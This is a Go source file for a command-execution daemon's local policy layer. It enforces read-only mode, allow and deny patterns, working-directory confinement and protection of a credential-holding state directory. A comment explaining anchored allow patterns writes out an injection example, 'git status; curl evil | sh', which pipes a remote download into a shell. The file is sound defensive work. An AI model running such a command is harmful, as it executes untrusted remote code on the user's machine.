// Package policy holds the limits an operator sets on a computer. Every one of them is
// enforced here, on the machine, so a compromised server cannot lift them by asking nicely.
package policy

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// ErrDenied is returned for anything the local policy refuses.
var ErrDenied = errors.New("refused by the local policy")

// ErrNoWorkingDirectory means a command named a directory to run in that is not there and is not
// this client's to create. Go reports a missing cmd.Dir as "fork/exec /bin/sh: no such file or
// directory", which sends everyone looking at the shell instead of at the path.
var ErrNoWorkingDirectory = errors.New("working directory does not exist")

// ErrNotADirectory means the path a command would run in is a file.
var ErrNotADirectory = errors.New("working directory is not a directory")

type Options struct {
	// ReadOnly refuses exec and every write; the computer can still be read from.
	ReadOnly bool
	// Allow, when non-empty, is the set a command must match at least one of. Patterns are
	// anchored to the whole command.
	Allow []string
	// Deny is checked first and always wins. Patterns are unanchored and are tried against
	// the whole command and against each of its lines.
	Deny []string
	// AllowEnv names environment variables the server may set even on a constrained computer.
	AllowEnv []string
	// WorkdirOnly confines file operations to Workdir.
	WorkdirOnly bool
	Workdir     string
	// StateDir holds the credential, the config and the audit log. File operations never
	// reach into it, in any mode, except through SessionsDir.
	StateDir string
	// SessionsDir is the one subtree of StateDir that file operations may use.
	SessionsDir string
}

type Policy struct {
	readOnly           bool
	allow              []*regexp.Regexp
	deny               []*regexp.Regexp
	allowedEnv         map[string]struct{}
	allowedEnvPrefixes []string
	restricted         bool
	workdirOnly        bool
	workdir            string
	stateDir           string
	sessionsDir        string
}

// New compiles the patterns once, so a bad expression fails at startup rather than on the
// first request that happens to hit it.
func New(options Options) (*Policy, error) {
	// An allow pattern is anchored to the whole command. Without that, `^git ` also permits
	// "git status; curl evil | sh", which is not what anyone writing it meant. (?s) lets the
	// pattern span a command that contains newlines rather than leaving them as a way past.
	allow, err := compile(options.Allow, "allow", func(pattern string) string {
		return `(?s)\A(?:` + pattern + `)\z`
	})
	if err != nil {
		return nil, err
	}
	deny, err := compile(options.Deny, "deny", func(pattern string) string { return pattern })
	if err != nil {
		return nil, err
	}

	workdir, err := resolveDir(options.Workdir, "working directory")
	if err != nil {
		return nil, err
	}
	if options.WorkdirOnly && workdir == "" {
		return nil, errors.New("--workdir-only needs a working directory")
	}
	stateDir, err := resolveDir(options.StateDir, "state directory")
	if err != nil {
		return nil, err
	}
	sessionsDir, err := resolveDir(options.SessionsDir, "sessions directory")
	if err != nil {
		return nil, err
	}

	allowedEnv := make(map[string]struct{}, len(options.AllowEnv))
	var allowedEnvPrefixes []string
	for _, name := range options.AllowEnv {
		trimmed := strings.TrimSpace(name)
		switch {
		case trimmed == "":
		case strings.HasSuffix(trimmed, "*"):
			allowedEnvPrefixes = append(allowedEnvPrefixes, strings.TrimSuffix(trimmed, "*"))
		default:
			allowedEnv[trimmed] = struct{}{}
		}
	}

	// A working directory that contains, or is, the state directory would put the credential
	// and the sweep's records inside the one subtree file operations are allowed to reach.
	if stateDir != "" && workdir != "" && (within(workdir, stateDir) || within(stateDir, workdir)) && !within(sessionsDir, workdir) {
		return nil, fmt.Errorf(
			"the working directory %s overlaps the state directory %s, which would expose the machine credential and the process-group records to the server; point --workdir somewhere else",
			workdir, stateDir)
	}

	return &Policy{
		readOnly:           options.ReadOnly,
		allow:              allow,
		deny:               deny,
		allowedEnv:         allowedEnv,
		allowedEnvPrefixes: allowedEnvPrefixes,
		restricted:         options.ReadOnly || options.WorkdirOnly || len(allow) > 0 || len(deny) > 0,
		workdirOnly:        options.WorkdirOnly,
		workdir:            workdir,
		stateDir:           stateDir,
		sessionsDir:        sessionsDir,
	}, nil
}

func compile(patterns []string, kind string, wrap func(string) string) ([]*regexp.Regexp, error) {
	compiled := make([]*regexp.Regexp, 0, len(patterns))
	for _, pattern := range patterns {
		expression, err := regexp.Compile(wrap(pattern))
		if err != nil {
			return nil, fmt.Errorf("compile %s pattern %q: %w", kind, pattern, err)
		}
		compiled = append(compiled, expression)
	}
	return compiled, nil
}

func resolveDir(path string, what string) (string, error) {
	if strings.TrimSpace(path) == "" {
		return "", nil
	}
	absolute, err := filepath.Abs(path)
	if err != nil {
		return "", fmt.Errorf("resolve the %s %s: %w", what, path, err)
	}
	return resolveExisting(absolute), nil
}

// ReadOnly reports whether writes are refused, for hello and status.
func (p *Policy) ReadOnly() bool {
	return p.readOnly
}

// Workdir is the resolved confinement root, empty when file operations are unconfined.
func (p *Policy) Workdir() string {
	return p.workdir
}

// Restricted reports whether the operator has constrained this computer, which is what turns
// the wider environment refusals on.
func (p *Policy) Restricted() bool {
	return p.restricted
}

// CheckExec decides whether a command may run. Deny is evaluated before allow, so a deny
// pattern cannot be defeated by widening the allow list.
func (p *Policy) CheckExec(command string) error {
	if p.readOnly {
		return fmt.Errorf("%w: this computer runs in read-only mode", ErrDenied)
	}
	if strings.TrimSpace(command) == "" {
		return fmt.Errorf("%w: empty command", ErrDenied)
	}
	if strings.ContainsRune(command, 0) {
		return fmt.Errorf("%w: the command contains a NUL byte", ErrDenied)
	}

	// Deny is tried against the whole command and against each line, because an anchored
	// pattern written for one command is otherwise sidestepped by putting it on line two.
	lines := strings.Split(command, "\n")
	for _, expression := range p.deny {
		if expression.MatchString(command) {
			return fmt.Errorf("%w: the command matches the deny pattern %s", ErrDenied, expression.String())
		}
		for _, line := range lines {
			if expression.MatchString(line) {
				return fmt.Errorf("%w: a line of the command matches the deny pattern %s", ErrDenied, expression.String())
			}
		}
	}

	if len(p.allow) == 0 {
		return nil
	}
	for _, expression := range p.allow {
		if expression.MatchString(command) {
			return nil
		}
	}
	return fmt.Errorf("%w: the command matches no allow pattern", ErrDenied)
}

// ResolveExecDir settles where one command runs. A request with no cwd gets the working
// directory, which is the sessions root the server was told about. A directory beneath that root
// is created on demand, because the server names a session's directory before anything has made
// it; anywhere else the directory must already exist, or a command would let the server create
// directories across the machine. Symlinks are resolved before the containment test, so a link
// inside the root cannot be used to build a tree outside it.
func (p *Policy) ResolveExecDir(cwd *string) (string, error) {
	requested := p.workdir
	if cwd != nil && *cwd != "" {
		requested = *cwd
	}
	if requested == "" {
		return "", nil
	}
	if strings.ContainsRune(requested, 0) {
		return "", fmt.Errorf("%w: the path contains a NUL byte", ErrNoWorkingDirectory)
	}
	absolute, err := filepath.Abs(requested)
	if err != nil {
		return "", fmt.Errorf("%w: %s", ErrNoWorkingDirectory, requested)
	}
	resolved := resolveExisting(absolute)

	info, statErr := os.Stat(resolved)
	if statErr == nil {
		if !info.IsDir() {
			return "", fmt.Errorf("%w: %s", ErrNotADirectory, requested)
		}
		return resolved, nil
	}
	if !errors.Is(statErr, os.ErrNotExist) || !within(p.workdir, resolved) {
		return "", fmt.Errorf("%w: %s", ErrNoWorkingDirectory, requested)
	}
	if err := os.MkdirAll(resolved, 0o700); err != nil {
		return "", fmt.Errorf("%w: %s: %w", ErrNoWorkingDirectory, requested, err)
	}
	return resolved, nil
}

// CheckRead resolves a path for reading and confines it when asked.
func (p *Policy) CheckRead(path string) (string, error) {
	return p.checkPath(path)
}

// CheckWrite resolves a path for writing, and refuses every write in read-only mode.
func (p *Policy) CheckWrite(path string) (string, error) {
	if p.readOnly {
		return "", fmt.Errorf("%w: this computer runs in read-only mode", ErrDenied)
	}
	return p.checkPath(path)
}

// checkPath resolves symlinks before comparing, because a prefix test on the literal string
// lets a symlink inside the working directory point anywhere on the machine.
func (p *Policy) checkPath(path string) (string, error) {
	if path == "" {
		return "", fmt.Errorf("%w: empty path", ErrDenied)
	}
	if strings.ContainsRune(path, 0) {
		return "", fmt.Errorf("%w: the path contains a NUL byte", ErrDenied)
	}
	absolute, err := filepath.Abs(path)
	if err != nil {
		return "", fmt.Errorf("%w: resolve %s: %s", ErrDenied, path, err)
	}
	resolved := resolveExisting(absolute)

	// The state directory holds the machine credential, the config the next start reads back,
	// and the records the next sweep kills by. None of those are the server's to touch, in any
	// mode, so this check is not conditional on --workdir-only.
	if p.stateDir != "" && within(p.stateDir, resolved) && !within(p.sessionsDir, resolved) {
		return "", fmt.Errorf("%w: %s is inside the daemon's state directory", ErrDenied, path)
	}

	if !p.workdirOnly {
		return resolved, nil
	}
	if !within(p.workdir, resolved) {
		return "", fmt.Errorf("%w: %s is outside the working directory", ErrDenied, path)
	}
	return resolved, nil
}

// within reports whether candidate is root or sits beneath it. It compares by identity —
// device and inode, through os.SameFile — rather than by string, because a string comparison
// is case-sensitive while APFS and NTFS are not: on macOS, `~/.AGENTUM/credential` reaches
// the same file as `~/.agentum/credential` and would pass a textual check for being
// outside it. Only when root does not exist does it fall back to comparing components.
func within(root string, candidate string) bool {
	if root == "" {
		return false
	}
	rootInfo, err := os.Stat(root)
	if err != nil {
		return withinLexically(root, candidate)
	}
	// Walk up from the candidate: if any of its ancestors is root, it is inside. The leaf
	// need not exist, which is the normal case for an upload.
	current := filepath.Clean(candidate)
	for {
		if info, statErr := os.Stat(current); statErr == nil && os.SameFile(rootInfo, info) {
			return true
		}
		parent := filepath.Dir(current)
		if parent == current {
			return false
		}
		current = parent
	}
}

func withinLexically(root string, candidate string) bool {
	relative, err := filepath.Rel(root, candidate)
	if err != nil {
		return false
	}
	return relative != ".." && !strings.HasPrefix(relative, ".."+string(filepath.Separator))
}

// resolveExisting follows symlinks as far up the path as the filesystem goes, then re-attaches
// the components that do not exist yet — an upload names a file that is about to be created.
func resolveExisting(absolute string) string {
	remainder := ""
	current := absolute
	for {
		if evaluated, err := filepath.EvalSymlinks(current); err == nil {
			if remainder == "" {
				return evaluated
			}
			return filepath.Join(evaluated, remainder)
		}
		parent := filepath.Dir(current)
		if parent == current {
			return absolute
		}
		remainder = filepath.Join(filepath.Base(current), remainder)
		current = parent
	}
}

// EnsureDirectory creates a directory the daemon owns, with permissions that keep other local
// users out of a machine that is shared.
func EnsureDirectory(path string) error {
	if err := os.MkdirAll(path, 0o700); err != nil {
		return fmt.Errorf("create %s: %w", path, err)
	}
	return nil
}
